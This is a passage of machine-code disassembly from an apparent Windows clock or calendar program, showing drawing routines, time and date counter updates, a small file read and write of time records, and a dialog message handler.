  40275c:	f2 0f 10 05 74 6e 0d 	movsd  0xd6e74(%rip),%xmm0        # 0x4d95d8
  402763:	00 
  402764:	44 8b 05 0d 8b 00 00 	mov    0x8b0d(%rip),%r8d        # 0x40b278
  40276b:	66 41 0f 28 c9       	movapd %xmm9,%xmm1
  402770:	45 31 c9             	xor    %r9d,%r9d
  402773:	48 89 d9             	mov    %rbx,%rcx
  402776:	f2 0f 59 c8          	mulsd  %xmm0,%xmm1
  40277a:	f2 0f 59 c6          	mulsd  %xmm6,%xmm0
  40277e:	f2 0f 2c c1          	cvttsd2si %xmm1,%eax
  402782:	f2 0f 2c d0          	cvttsd2si %xmm0,%edx
  402786:	03 15 f0 8a 00 00    	add    0x8af0(%rip),%edx        # 0x40b27c
  40278c:	41 29 c0             	sub    %eax,%r8d
  40278f:	ff d5                	call   *%rbp
  402791:	f2 0f 10 05 47 6e 0d 	movsd  0xd6e47(%rip),%xmm0        # 0x4d95e0
  402798:	00 
  402799:	44 8b 05 d8 8a 00 00 	mov    0x8ad8(%rip),%r8d        # 0x40b278
  4027a0:	48 89 d9             	mov    %rbx,%rcx
  4027a3:	f2 44 0f 59 c8       	mulsd  %xmm0,%xmm9
  4027a8:	f2 0f 59 f0          	mulsd  %xmm0,%xmm6
  4027ac:	f2 41 0f 2c c1       	cvttsd2si %xmm9,%eax
  4027b1:	f2 0f 2c d6          	cvttsd2si %xmm6,%edx
  4027b5:	03 15 c1 8a 00 00    	add    0x8ac1(%rip),%edx        # 0x40b27c
  4027bb:	41 29 c0             	sub    %eax,%r8d
  4027be:	ff d7                	call   *%rdi
  4027c0:	f2 0f 2a 05 70 98 0d 	cvtsi2sdl 0xd9870(%rip),%xmm0        # 0x4dc038
  4027c7:	00 
  4027c8:	f2 0f 2a 35 6c 98 0d 	cvtsi2sdl 0xd986c(%rip),%xmm6        # 0x4dc03c
  4027cf:	00 
  4027d0:	f2 41 0f 5e c2       	divsd  %xmm10,%xmm0
  4027d5:	45 31 c0             	xor    %r8d,%r8d
  4027d8:	31 c9                	xor    %ecx,%ecx
  4027da:	ba 04 00 00 00       	mov    $0x4,%edx
  4027df:	f2 0f 58 f0          	addsd  %xmm0,%xmm6
  4027e3:	f2 0f 59 35 fd 6d 0d 	mulsd  0xd6dfd(%rip),%xmm6        # 0x4d95e8
  4027ea:	00 
  4027eb:	41 ff d4             	call   *%r12
  4027ee:	48 89 d9             	mov    %rbx,%rcx
  4027f1:	49 89 c5             	mov    %rax,%r13
  4027f4:	48 89 c2             	mov    %rax,%rdx
  4027f7:	ff d6                	call   *%rsi
  4027f9:	45 31 c9             	xor    %r9d,%r9d
  4027fc:	48 89 d9             	mov    %rbx,%rcx
  4027ff:	44 8b 05 72 8a 00 00 	mov    0x8a72(%rip),%r8d        # 0x40b278
  402806:	8b 15 70 8a 00 00    	mov    0x8a70(%rip),%edx        # 0x40b27c
  40280c:	f2 41 0f 59 f0       	mulsd  %xmm8,%xmm6
  402811:	ff d5                	call   *%rbp
  402813:	f2 0f 5e f7          	divsd  %xmm7,%xmm6
  402817:	66 0f 28 c6          	movapd %xmm6,%xmm0
  40281b:	e8 40 2b 00 00       	call   0x405360
  402820:	66 44 0f 28 c8       	movapd %xmm0,%xmm9
  402825:	66 0f 28 c6          	movapd %xmm6,%xmm0
  402829:	e8 22 2a 00 00       	call   0x405250
  40282e:	f2 0f 10 15 ba 6d 0d 	movsd  0xd6dba(%rip),%xmm2        # 0x4d95f0
  402835:	00 
  402836:	44 8b 05 3b 8a 00 00 	mov    0x8a3b(%rip),%r8d        # 0x40b278
  40283d:	48 89 d9             	mov    %rbx,%rcx
  402840:	f2 44 0f 59 ca       	mulsd  %xmm2,%xmm9
  402845:	f2 0f 59 c2          	mulsd  %xmm2,%xmm0
  402849:	f2 41 0f 2c c1       	cvttsd2si %xmm9,%eax
  40284e:	f2 0f 2c d0          	cvttsd2si %xmm0,%edx
  402852:	03 15 24 8a 00 00    	add    0x8a24(%rip),%edx        # 0x40b27c
  402858:	41 29 c0             	sub    %eax,%r8d
  40285b:	ff d7                	call   *%rdi
  40285d:	8b 05 d5 97 0d 00    	mov    0xd97d5(%rip),%eax        # 0x4dc038
  402863:	45 31 c0             	xor    %r8d,%r8d
  402866:	31 c9                	xor    %ecx,%ecx
  402868:	ba 01 00 00 00       	mov    $0x1,%edx
  40286d:	8d 04 40             	lea    (%rax,%rax,2),%eax
  402870:	01 c0                	add    %eax,%eax
  402872:	f2 0f 2a f0          	cvtsi2sd %eax,%xmm6
  402876:	41 ff d4             	call   *%r12
  402879:	48 89 d9             	mov    %rbx,%rcx
  40287c:	49 89 c4             	mov    %rax,%r12
  40287f:	48 89 c2             	mov    %rax,%rdx
  402882:	ff d6                	call   *%rsi
  402884:	45 31 c9             	xor    %r9d,%r9d
  402887:	48 89 d9             	mov    %rbx,%rcx
  40288a:	44 8b 05 e7 89 00 00 	mov    0x89e7(%rip),%r8d        # 0x40b278
  402891:	8b 15 e5 89 00 00    	mov    0x89e5(%rip),%edx        # 0x40b27c
  402897:	ff d5                	call   *%rbp
  402899:	f2 41 0f 59 f0       	mulsd  %xmm8,%xmm6
  40289e:	f2 0f 5e f7          	divsd  %xmm7,%xmm6
  4028a2:	66 0f 28 c6          	movapd %xmm6,%xmm0
  4028a6:	e8 b5 2a 00 00       	call   0x405360
  4028ab:	66 0f 28 f8          	movapd %xmm0,%xmm7
  4028af:	66 0f 28 c6          	movapd %xmm6,%xmm0
  4028b3:	e8 98 29 00 00       	call   0x405250
  4028b8:	f2 0f 10 15 38 6d 0d 	movsd  0xd6d38(%rip),%xmm2        # 0x4d95f8
  4028bf:	00 
  4028c0:	44 8b 05 b1 89 00 00 	mov    0x89b1(%rip),%r8d        # 0x40b278
  4028c7:	48 89 d9             	mov    %rbx,%rcx
  4028ca:	f2 0f 59 fa          	mulsd  %xmm2,%xmm7
  4028ce:	f2 0f 59 c2          	mulsd  %xmm2,%xmm0
  4028d2:	f2 0f 2c c7          	cvttsd2si %xmm7,%eax
  4028d6:	f2 0f 2c d0          	cvttsd2si %xmm0,%edx
  4028da:	03 15 9c 89 00 00    	add    0x899c(%rip),%edx        # 0x40b27c
  4028e0:	41 29 c0             	sub    %eax,%r8d
  4028e3:	ff d7                	call   *%rdi
  4028e5:	48 8b 54 24 28       	mov    0x28(%rsp),%rdx
  4028ea:	48 89 d9             	mov    %rbx,%rcx
  4028ed:	ff d6                	call   *%rsi
  4028ef:	48 8b 1d 1a bc 0d 00 	mov    0xdbc1a(%rip),%rbx        # 0x4de510
  4028f6:	4c 89 f1             	mov    %r14,%rcx
  4028f9:	ff d3                	call   *%rbx
  4028fb:	4c 89 f9             	mov    %r15,%rcx
  4028fe:	ff d3                	call   *%rbx
  402900:	4c 89 e9             	mov    %r13,%rcx
  402903:	ff d3                	call   *%rbx
  402905:	90                   	nop
  402906:	0f 28 74 24 30       	movaps 0x30(%rsp),%xmm6
  40290b:	4c 89 e1             	mov    %r12,%rcx
  40290e:	48 89 da             	mov    %rbx,%rdx
  402911:	0f 28 7c 24 40       	movaps 0x40(%rsp),%xmm7
  402916:	44 0f 28 44 24 50    	movaps 0x50(%rsp),%xmm8
  40291c:	44 0f 28 4c 24 60    	movaps 0x60(%rsp),%xmm9
  402922:	44 0f 28 54 24 70    	movaps 0x70(%rsp),%xmm10
  402928:	48 81 c4 88 00 00 00 	add    $0x88,%rsp
  40292f:	5b                   	pop    %rbx
  402930:	5e                   	pop    %rsi
  402931:	5f                   	pop    %rdi
  402932:	5d                   	pop    %rbp
  402933:	41 5c                	pop    %r12
  402935:	41 5d                	pop    %r13
  402937:	41 5e                	pop    %r14
  402939:	41 5f                	pop    %r15
  40293b:	48 ff e2             	rex.W jmp *%rdx
  40293e:	66 90                	xchg   %ax,%ax
  402940:	41 57                	push   %r15
  402942:	41 56                	push   %r14
  402944:	41 55                	push   %r13
  402946:	41 54                	push   %r12
  402948:	55                   	push   %rbp
  402949:	57                   	push   %rdi
  40294a:	56                   	push   %rsi
  40294b:	53                   	push   %rbx
  40294c:	48 81 ec b8 00 00 00 	sub    $0xb8,%rsp
  402953:	41 b8 c8 c8 c8 00    	mov    $0xc8c8c8,%r8d
  402959:	ba 03 00 00 00       	mov    $0x3,%edx
  40295e:	48 89 cb             	mov    %rcx,%rbx
  402961:	31 c9                	xor    %ecx,%ecx
  402963:	4c 8d 7c 24 70       	lea    0x70(%rsp),%r15
  402968:	ff 15 8a bb 0d 00    	call   *0xdbb8a(%rip)        # 0x4de4f8
  40296e:	48 89 d9             	mov    %rbx,%rcx
  402971:	48 89 c2             	mov    %rax,%rdx
  402974:	48 8b 35 c5 bb 0d 00 	mov    0xdbbc5(%rip),%rsi        # 0x4de540
  40297b:	49 89 c4             	mov    %rax,%r12
  40297e:	ff d6                	call   *%rsi
  402980:	41 b9 7a 03 00 00    	mov    $0x37a,%r9d
  402986:	41 b8 78 00 00 00    	mov    $0x78,%r8d
  40298c:	ba 6c 02 00 00       	mov    $0x26c,%edx
  402991:	48 89 d9             	mov    %rbx,%rcx
  402994:	49 89 c6             	mov    %rax,%r14
  402997:	c7 44 24 20 22 01 00 	movl   $0x122,0x20(%rsp)
  40299e:	00 
  40299f:	ff 15 93 bb 0d 00    	call   *0xdbb93(%rip)        # 0x4de538
  4029a5:	48 8d 05 52 69 0d 00 	lea    0xd6952(%rip),%rax        # 0x4d92fe
  4029ac:	45 31 c9             	xor    %r9d,%r9d
  4029af:	45 31 c0             	xor    %r8d,%r8d
  4029b2:	31 d2                	xor    %edx,%edx
  4029b4:	b9 14 00 00 00       	mov    $0x14,%ecx
  4029b9:	c7 44 24 60 00 00 00 	movl   $0x0,0x60(%rsp)
  4029c0:	00 
  4029c1:	48 89 44 24 68       	mov    %rax,0x68(%rsp)
  4029c6:	c7 44 24 58 00 00 00 	movl   $0x0,0x58(%rsp)
  4029cd:	00 
  4029ce:	c7 44 24 50 00 00 00 	movl   $0x0,0x50(%rsp)
  4029d5:	00 
  4029d6:	c7 44 24 48 00 00 00 	movl   $0x0,0x48(%rsp)
  4029dd:	00 
  4029de:	c7 44 24 40 01 00 00 	movl   $0x1,0x40(%rsp)
  4029e5:	00 
  4029e6:	c7 44 24 38 00 00 00 	movl   $0x0,0x38(%rsp)
  4029ed:	00 
  4029ee:	c7 44 24 30 00 00 00 	movl   $0x0,0x30(%rsp)
  4029f5:	00 
  4029f6:	c7 44 24 28 00 00 00 	movl   $0x0,0x28(%rsp)
  4029fd:	00 
  4029fe:	c7 44 24 20 90 01 00 	movl   $0x190,0x20(%rsp)
  402a05:	00 
  402a06:	ff 15 e4 ba 0d 00    	call   *0xdbae4(%rip)        # 0x4de4f0
  402a0c:	48 89 d9             	mov    %rbx,%rcx
  402a0f:	48 89 c2             	mov    %rax,%rdx
  402a12:	48 89 c5             	mov    %rax,%rbp
  402a15:	ff d6                	call   *%rsi
  402a17:	31 d2                	xor    %edx,%edx
  402a19:	48 89 d9             	mov    %rbx,%rcx
  402a1c:	49 89 c5             	mov    %rax,%r13
  402a1f:	ff 15 2b bb 0d 00    	call   *0xdbb2b(%rip)        # 0x4de550
  402a25:	ba 01 00 00 00       	mov    $0x1,%edx
  402a2a:	48 89 d9             	mov    %rbx,%rcx
  402a2d:	ff 15 15 bb 0d 00    	call   *0xdbb15(%rip)        # 0x4de548
  402a33:	4c 8d 0d ca 68 0d 00 	lea    0xd68ca(%rip),%r9        # 0x4d9304
  402a3a:	41 b8 96 00 00 00    	mov    $0x96,%r8d
  402a40:	ba c6 02 00 00       	mov    $0x2c6,%edx
  402a45:	48 89 d9             	mov    %rbx,%rcx
  402a48:	c7 44 24 20 0c 00 00 	movl   $0xc,0x20(%rsp)
  402a4f:	00 
  402a50:	48 8b 3d 01 bb 0d 00 	mov    0xdbb01(%rip),%rdi        # 0x4de558
  402a57:	ff d7                	call   *%rdi
  402a59:	8b 05 d9 95 0d 00    	mov    0xd95d9(%rip),%eax        # 0x4dc038
  402a5f:	44 8b 0d d6 95 0d 00 	mov    0xd95d6(%rip),%r9d        # 0x4dc03c
  402a66:	48 8d 15 a4 68 0d 00 	lea    0xd68a4(%rip),%rdx        # 0x4d9311
  402a6d:	44 8b 05 cc 95 0d 00 	mov    0xd95cc(%rip),%r8d        # 0x4dc040
  402a74:	4c 89 f9             	mov    %r15,%rcx
  402a77:	89 44 24 20          	mov    %eax,0x20(%rsp)
  402a7b:	e8 68 75 00 00       	call   0x409fe8
  402a80:	4c 89 f8             	mov    %r15,%rax
  402a83:	8b 10                	mov    (%rax),%edx
  402a85:	48 83 c0 04          	add    $0x4,%rax
  402a89:	44 8d 82 ff fe fe fe 	lea    -0x1010101(%rdx),%r8d
  402a90:	f7 d2                	not    %edx
  402a92:	41 21 d0             	and    %edx,%r8d
  402a95:	41 81 e0 80 80 80 80 	and    $0x80808080,%r8d
  402a9c:	74 e5                	je     0x402a83
  402a9e:	44 89 c2             	mov    %r8d,%edx
  402aa1:	4d 89 f9             	mov    %r15,%r9
  402aa4:	48 89 d9             	mov    %rbx,%rcx
  402aa7:	c1 ea 10             	shr    $0x10,%edx
  402aaa:	41 f7 c0 80 80 00 00 	test   $0x8080,%r8d
  402ab1:	44 0f 44 c2          	cmove  %edx,%r8d
  402ab5:	48 8d 50 02          	lea    0x2(%rax),%rdx
  402ab9:	48 0f 44 c2          	cmove  %rdx,%rax
  402abd:	45 00 c0             	add    %r8b,%r8b
  402ac0:	ba d0 02 00 00       	mov    $0x2d0,%edx
  402ac5:	48 83 d8 03          	sbb    $0x3,%rax
  402ac9:	41 b8 f0 00 00 00    	mov    $0xf0,%r8d
  402acf:	4c 29 f8             	sub    %r15,%rax
  402ad2:	4c 8d bc 24 90 00 00 	lea    0x90(%rsp),%r15
  402ad9:	00 
  402ada:	89 44 24 20          	mov    %eax,0x20(%rsp)
  402ade:	ff d7                	call   *%rdi
  402ae0:	8b 05 86 87 00 00    	mov    0x8786(%rip),%eax        # 0x40b26c
  402ae6:	44 8b 0d 83 87 00 00 	mov    0x8783(%rip),%r9d        # 0x40b270
  402aed:	48 8d 15 2c 68 0d 00 	lea    0xd682c(%rip),%rdx        # 0x4d9320
  402af4:	44 8b 05 79 87 00 00 	mov    0x8779(%rip),%r8d        # 0x40b274
  402afb:	4c 89 f9             	mov    %r15,%rcx
  402afe:	89 44 24 20          	mov    %eax,0x20(%rsp)
  402b02:	e8 e1 74 00 00       	call   0x409fe8
  402b07:	4c 89 fa             	mov    %r15,%rdx
  402b0a:	8b 0a                	mov    (%rdx),%ecx
  402b0c:	48 83 c2 04          	add    $0x4,%rdx
  402b10:	8d 81 ff fe fe fe    	lea    -0x1010101(%rcx),%eax
  402b16:	f7 d1                	not    %ecx
  402b18:	21 c8                	and    %ecx,%eax
  402b1a:	25 80 80 80 80       	and    $0x80808080,%eax
  402b1f:	74 e9                	je     0x402b0a
  402b21:	89 c1                	mov    %eax,%ecx
  402b23:	4d 89 f9             	mov    %r15,%r9
  402b26:	41 b8 cd 00 00 00    	mov    $0xcd,%r8d
  402b2c:	c1 e9 10             	shr    $0x10,%ecx
  402b2f:	a9 80 80 00 00       	test   $0x8080,%eax
  402b34:	0f 44 c1             	cmove  %ecx,%eax
  402b37:	48 8d 4a 02          	lea    0x2(%rdx),%rcx
  402b3b:	48 0f 44 d1          	cmove  %rcx,%rdx
  402b3f:	00 c0                	add    %al,%al
  402b41:	48 89 d9             	mov    %rbx,%rcx
  402b44:	48 83 da 03          	sbb    $0x3,%rdx
  402b48:	4c 29 fa             	sub    %r15,%rdx
  402b4b:	89 54 24 20          	mov    %edx,0x20(%rsp)
  402b4f:	ba bc 02 00 00       	mov    $0x2bc,%edx
  402b54:	ff d7                	call   *%rdi
  402b56:	4c 89 f2             	mov    %r14,%rdx
  402b59:	48 89 d9             	mov    %rbx,%rcx
  402b5c:	ff d6                	call   *%rsi
  402b5e:	4c 89 ea             	mov    %r13,%rdx
  402b61:	48 89 d9             	mov    %rbx,%rcx
  402b64:	ff d6                	call   *%rsi
  402b66:	48 8b 1d a3 b9 0d 00 	mov    0xdb9a3(%rip),%rbx        # 0x4de510
  402b6d:	4c 89 e1             	mov    %r12,%rcx
  402b70:	ff d3                	call   *%rbx
  402b72:	48 89 e9             	mov    %rbp,%rcx
  402b75:	ff d3                	call   *%rbx
  402b77:	90                   	nop
  402b78:	48 81 c4 b8 00 00 00 	add    $0xb8,%rsp
  402b7f:	5b                   	pop    %rbx
  402b80:	5e                   	pop    %rsi
  402b81:	5f                   	pop    %rdi
  402b82:	5d                   	pop    %rbp
  402b83:	41 5c                	pop    %r12
  402b85:	41 5d                	pop    %r13
  402b87:	41 5e                	pop    %r14
  402b89:	41 5f                	pop    %r15
  402b8b:	c3                   	ret
  402b8c:	0f 1f 40 00          	nopl   0x0(%rax)
  402b90:	53                   	push   %rbx
  402b91:	48 83 ec 20          	sub    $0x20,%rsp
  402b95:	8b 42 08             	mov    0x8(%rdx),%eax
  402b98:	48 89 cb             	mov    %rcx,%rbx
  402b9b:	89 c1                	mov    %eax,%ecx
  402b9d:	c1 e9 1f             	shr    $0x1f,%ecx
  402ba0:	01 c8                	add    %ecx,%eax
  402ba2:	48 89 d9             	mov    %rbx,%rcx
  402ba5:	d1 f8                	sar    $1,%eax
  402ba7:	2d 96 00 00 00       	sub    $0x96,%eax
  402bac:	89 05 ca 86 00 00    	mov    %eax,0x86ca(%rip)        # 0x40b27c
  402bb2:	8b 42 0c             	mov    0xc(%rdx),%eax
  402bb5:	89 c2                	mov    %eax,%edx
  402bb7:	c1 ea 1f             	shr    $0x1f,%edx
  402bba:	01 d0                	add    %edx,%eax
  402bbc:	d1 f8                	sar    $1,%eax
  402bbe:	89 05 b4 86 00 00    	mov    %eax,0x86b4(%rip)        # 0x40b278
  402bc4:	e8 c7 f3 ff ff       	call   0x401f90
  402bc9:	48 89 d9             	mov    %rbx,%rcx
  402bcc:	e8 2f fa ff ff       	call   0x402600
  402bd1:	48 89 d9             	mov    %rbx,%rcx
  402bd4:	48 83 c4 20          	add    $0x20,%rsp
  402bd8:	5b                   	pop    %rbx
  402bd9:	e9 62 fd ff ff       	jmp    0x402940
  402bde:	66 90                	xchg   %ax,%ax
  402be0:	8b 05 52 94 0d 00    	mov    0xd9452(%rip),%eax        # 0x4dc038
  402be6:	83 c0 01             	add    $0x1,%eax
  402be9:	83 f8 3b             	cmp    $0x3b,%eax
  402bec:	89 05 46 94 0d 00    	mov    %eax,0xd9446(%rip)        # 0x4dc038
  402bf2:	0f 8e b8 00 00 00    	jle    0x402cb0
  402bf8:	8b 05 3e 94 0d 00    	mov    0xd943e(%rip),%eax        # 0x4dc03c
  402bfe:	c7 05 30 94 0d 00 00 	movl   $0x0,0xd9430(%rip)        # 0x4dc038
  402c05:	00 00 00 
  402c08:	83 c0 01             	add    $0x1,%eax
  402c0b:	83 f8 3b             	cmp    $0x3b,%eax
  402c0e:	89 05 28 94 0d 00    	mov    %eax,0xd9428(%rip)        # 0x4dc03c
  402c14:	0f 8e 96 00 00 00    	jle    0x402cb0
  402c1a:	8b 05 20 94 0d 00    	mov    0xd9420(%rip),%eax        # 0x4dc040
  402c20:	c7 05 12 94 0d 00 00 	movl   $0x0,0xd9412(%rip)        # 0x4dc03c
  402c27:	00 00 00 
  402c2a:	83 c0 01             	add    $0x1,%eax
  402c2d:	83 f8 17             	cmp    $0x17,%eax
  402c30:	89 05 0a 94 0d 00    	mov    %eax,0xd940a(%rip)        # 0x4dc040
  402c36:	7e 78                	jle    0x402cb0
  402c38:	8b 05 32 86 00 00    	mov    0x8632(%rip),%eax        # 0x40b270
  402c3e:	8b 0d 28 86 00 00    	mov    0x8628(%rip),%ecx        # 0x40b26c
  402c44:	ba 1e 00 00 00       	mov    $0x1e,%edx
  402c49:	c7 05 ed 93 0d 00 00 	movl   $0x0,0xd93ed(%rip)        # 0x4dc040
  402c50:	00 00 00 
  402c53:	41 89 c0             	mov    %eax,%r8d
  402c56:	83 c1 01             	add    $0x1,%ecx
  402c59:	41 83 e0 fd          	and    $0xfffffffd,%r8d
  402c5d:	89 0d 09 86 00 00    	mov    %ecx,0x8609(%rip)        # 0x40b26c
  402c63:	41 83 f8 04          	cmp    $0x4,%r8d
  402c67:	74 16                	je     0x402c7f
  402c69:	83 f8 09             	cmp    $0x9,%eax
  402c6c:	74 11                	je     0x402c7f
  402c6e:	83 f8 0b             	cmp    $0xb,%eax
  402c71:	74 0c                	je     0x402c7f
  402c73:	31 d2                	xor    %edx,%edx
  402c75:	83 f8 02             	cmp    $0x2,%eax
  402c78:	0f 95 c2             	setne  %dl
  402c7b:	8d 54 52 1c          	lea    0x1c(%rdx,%rdx,2),%edx
  402c7f:	39 ca                	cmp    %ecx,%edx
  402c81:	7d 2d                	jge    0x402cb0
  402c83:	83 c0 01             	add    $0x1,%eax
  402c86:	c7 05 dc 85 00 00 01 	movl   $0x1,0x85dc(%rip)        # 0x40b26c
  402c8d:	00 00 00 
  402c90:	83 f8 0c             	cmp    $0xc,%eax
  402c93:	89 05 d7 85 00 00    	mov    %eax,0x85d7(%rip)        # 0x40b270
  402c99:	7e 15                	jle    0x402cb0
  402c9b:	83 05 d2 85 00 00 01 	addl   $0x1,0x85d2(%rip)        # 0x40b274
  402ca2:	c7 05 c4 85 00 00 01 	movl   $0x1,0x85c4(%rip)        # 0x40b270
  402ca9:	00 00 00 
  402cac:	0f 1f 40 00          	nopl   0x0(%rax)
  402cb0:	f3 c3                	repz ret
  402cb2:	66 66 66 66 66 2e 0f 	data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
  402cb9:	1f 84 00 00 00 00 00 
  402cc0:	57                   	push   %rdi
  402cc1:	56                   	push   %rsi
  402cc2:	53                   	push   %rbx
  402cc3:	48 83 ec 40          	sub    $0x40,%rsp
  402cc7:	48 8d 15 65 66 0d 00 	lea    0xd6665(%rip),%rdx        # 0x4d9333
  402cce:	48 8d 0d 60 66 0d 00 	lea    0xd6660(%rip),%rcx        # 0x4d9335
  402cd5:	e8 16 73 00 00       	call   0x409ff0
  402cda:	48 85 c0             	test   %rax,%rax
  402cdd:	48 89 c3             	mov    %rax,%rbx
  402ce0:	0f 84 83 00 00 00    	je     0x402d69
  402ce6:	c7 05 40 93 0d 00 00 	movl   $0x0,0xd9340(%rip)        # 0x4dc030
  402ced:	00 00 00 
  402cf0:	48 8d 74 24 3c       	lea    0x3c(%rsp),%rsi
  402cf5:	48 8d 3d 04 a7 0d 00 	lea    0xda704(%rip),%rdi        # 0x4dd400
  402cfc:	eb 3f                	jmp    0x402d3d
  402cfe:	66 90                	xchg   %ax,%ax
  402d00:	44 8b 05 29 93 0d 00 	mov    0xd9329(%rip),%r8d        # 0x4dc030
  402d07:	41 83 f8 09          	cmp    $0x9,%r8d
  402d0b:	7f 53                	jg     0x402d60
  402d0d:	49 63 d0             	movslq %r8d,%rdx
  402d10:	8b 44 24 34          	mov    0x34(%rsp),%eax
  402d14:	41 83 c0 01          	add    $0x1,%r8d
  402d18:	48 c1 e2 04          	shl    $0x4,%rdx
  402d1c:	44 89 05 0d 93 0d 00 	mov    %r8d,0xd930d(%rip)        # 0x4dc030
  402d23:	48 01 fa             	add    %rdi,%rdx
  402d26:	89 02                	mov    %eax,(%rdx)
  402d28:	8b 44 24 38          	mov    0x38(%rsp),%eax
  402d2c:	c7 42 0c 01 00 00 00 	movl   $0x1,0xc(%rdx)
  402d33:	89 42 04             	mov    %eax,0x4(%rdx)
  402d36:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
  402d3a:	89 42 08             	mov    %eax,0x8(%rdx)
  402d3d:	4c 8d 4c 24 38       	lea    0x38(%rsp),%r9
  402d42:	4c 8d 44 24 34       	lea    0x34(%rsp),%r8
  402d47:	48 8d 15 f8 65 0d 00 	lea    0xd65f8(%rip),%rdx        # 0x4d9346
  402d4e:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
  402d53:	48 89 d9             	mov    %rbx,%rcx
  402d56:	e8 9d 72 00 00       	call   0x409ff8
  402d5b:	83 f8 03             	cmp    $0x3,%eax
  402d5e:	74 a0                	je     0x402d00
  402d60:	48 89 d9             	mov    %rbx,%rcx
  402d63:	e8 98 72 00 00       	call   0x40a000
  402d68:	90                   	nop
  402d69:	48 83 c4 40          	add    $0x40,%rsp
  402d6d:	5b                   	pop    %rbx
  402d6e:	5e                   	pop    %rsi
  402d6f:	5f                   	pop    %rdi
  402d70:	c3                   	ret
  402d71:	66 66 66 66 66 66 2e 	data16 data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
  402d78:	0f 1f 84 00 00 00 00 
  402d7f:	00 
  402d80:	57                   	push   %rdi
  402d81:	56                   	push   %rsi
  402d82:	53                   	push   %rbx
  402d83:	48 83 ec 40          	sub    $0x40,%rsp
  402d87:	8b 05 a3 92 0d 00    	mov    0xd92a3(%rip),%eax        # 0x4dc030
  402d8d:	89 cb                	mov    %ecx,%ebx
  402d8f:	89 d6                	mov    %edx,%esi
  402d91:	83 f8 09             	cmp    $0x9,%eax
  402d94:	7e 0a                	jle    0x402da0
  402d96:	48 83 c4 40          	add    $0x40,%rsp
  402d9a:	5b                   	pop    %rbx
  402d9b:	5e                   	pop    %rsi
  402d9c:	5f                   	pop    %rdi
  402d9d:	c3                   	ret
  402d9e:	66 90                	xchg   %ax,%ax
  402da0:	48 63 d0             	movslq %eax,%rdx
  402da3:	4c 8d 15 56 a6 0d 00 	lea    0xda656(%rip),%r10        # 0x4dd400
  402daa:	83 c0 01             	add    $0x1,%eax
  402dad:	48 c1 e2 04          	shl    $0x4,%rdx
  402db1:	89 05 79 92 0d 00    	mov    %eax,0xd9279(%rip)        # 0x4dc030
  402db7:	49 01 d2             	add    %rdx,%r10
  402dba:	48 8d 15 8e 65 0d 00 	lea    0xd658e(%rip),%rdx        # 0x4d934f
  402dc1:	41 89 0a             	mov    %ecx,(%r10)
  402dc4:	48 8d 0d 6a 65 0d 00 	lea    0xd656a(%rip),%rcx        # 0x4d9335
  402dcb:	45 89 42 08          	mov    %r8d,0x8(%r10)
  402dcf:	41 89 72 04          	mov    %esi,0x4(%r10)
  402dd3:	41 c7 42 0c 01 00 00 	movl   $0x1,0xc(%r10)
  402dda:	00 
  402ddb:	44 89 44 24 38       	mov    %r8d,0x38(%rsp)
  402de0:	e8 0b 72 00 00       	call   0x409ff0
  402de5:	48 85 c0             	test   %rax,%rax
  402de8:	48 89 c7             	mov    %rax,%rdi
  402deb:	44 8b 44 24 38       	mov    0x38(%rsp),%r8d
  402df0:	74 a4                	je     0x402d96
  402df2:	48 8d 15 58 65 0d 00 	lea    0xd6558(%rip),%rdx        # 0x4d9351
  402df9:	44 89 44 24 20       	mov    %r8d,0x20(%rsp)
  402dfe:	41 89 f1             	mov    %esi,%r9d
  402e01:	41 89 d8             	mov    %ebx,%r8d
  402e04:	48 89 c1             	mov    %rax,%rcx
  402e07:	e8 fc 71 00 00       	call   0x40a008
  402e0c:	48 89 f9             	mov    %rdi,%rcx
  402e0f:	48 83 c4 40          	add    $0x40,%rsp
  402e13:	5b                   	pop    %rbx
  402e14:	5e                   	pop    %rsi
  402e15:	5f                   	pop    %rdi
  402e16:	e9 e5 71 00 00       	jmp    0x40a000
  402e1b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  402e20:	55                   	push   %rbp
  402e21:	57                   	push   %rdi
  402e22:	56                   	push   %rsi
  402e23:	53                   	push   %rbx
  402e24:	48 83 ec 28          	sub    $0x28,%rsp
  402e28:	81 fa 10 01 00 00    	cmp    $0x110,%edx
  402e2e:	48 89 cb             	mov    %rcx,%rbx
  402e31:	74 1d                	je     0x402e50
  402e33:	31 c0                	xor    %eax,%eax
  402e35:	81 fa 11 01 00 00    	cmp    $0x111,%edx
  402e3b:	74 63                	je     0x402ea0
  402e3d:	48 83 c4 28          	add    $0x28,%rsp
  402e41:	5b                   	pop    %rbx
  402e42:	5e                   	pop    %rsi
  402e43:	5f                   	pop    %rdi
  402e44:	5d                   	pop    %rbp
  402e45:	c3                   	ret
  402e46:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  402e4d:	00 00 00 
  402e50:	48 8b 35 a1 ba 0d 00 	mov    0xdbaa1(%rip),%rsi        # 0x4de8f8
  402e57:	45 31 c9             	xor    %r9d,%r9d
  402e5a:	44 8b 05 df 91 0d 00 	mov    0xd91df(%rip),%r8d        # 0x4dc040
  402e61:	ba e9 03 00 00       	mov    $0x3e9,%edx
  402e66:	ff d6                	call   *%rsi
  402e68:	45 31 c9             	xor    %r9d,%r9d
  402e6b:	48 89 d9             	mov    %rbx,%rcx
  402e6e:	44 8b 05 c7 91 0d 00 	mov    0xd91c7(%rip),%r8d        # 0x4dc03c
  402e75:	ba ea 03 00 00       	mov    $0x3ea,%edx
  402e7a:	ff d6                	call   *%rsi
  402e7c:	45 31 c9             	xor    %r9d,%r9d
  402e7f:	45 31 c0             	xor    %r8d,%r8d
  402e82:	ba eb 03 00 00       	mov    $0x3eb,%edx
  402e87:	48 89 d9             	mov    %rbx,%rcx
  402e8a:	ff d6                	call   *%rsi
  402e8c:	b8 01 00 00 00       	mov    $0x1,%eax
  402e91:	48 83 c4 28          	add    $0x28,%rsp
  402e95:	5b                   	pop    %rbx
  402e96:	5e                   	pop    %rsi
  402e97:	5f                   	pop    %rdi
  402e98:	5d                   	pop    %rbp
  402e99:	c3                   	ret
  402e9a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  402ea0:	66 41 83 f8 01       	cmp    $0x1,%r8w
  402ea5:	74 1e                	je     0x402ec5
  402ea7:	31 c0                	xor    %eax,%eax
  402ea9:	66 41 83 f8 02       	cmp    $0x2,%r8w
